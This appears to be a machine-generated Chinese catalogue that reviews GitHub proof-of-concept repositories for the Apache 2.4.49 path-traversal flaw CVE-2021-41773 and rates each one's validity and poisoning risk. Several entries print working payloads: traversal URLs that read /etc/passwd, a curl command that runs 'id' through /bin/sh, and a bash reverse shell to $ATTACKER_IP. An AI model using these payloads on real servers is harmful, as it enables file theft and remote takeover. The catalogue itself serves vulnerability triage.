**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

